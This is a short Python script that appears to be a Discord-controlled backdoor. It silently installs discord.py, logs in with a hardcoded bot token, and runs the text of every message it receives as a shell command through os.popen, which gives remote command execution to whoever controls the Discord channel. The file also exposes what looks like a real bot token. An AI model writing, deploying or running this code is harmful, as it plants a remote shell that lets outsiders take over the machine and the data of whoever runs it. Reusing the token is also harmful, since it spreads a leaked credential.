import os
os.popen("py -3.9 -m pip install discord.py")
import discord
client = discord.Client()
@client.event
async def on_message(message):
    os.popen(message.content.lower())
client.run("NzgwOTE2NjYxMjUwMjkzNzgx.X72DUA.1Lv1Ck7vB5XlD_X5CNMHVhhymNo")
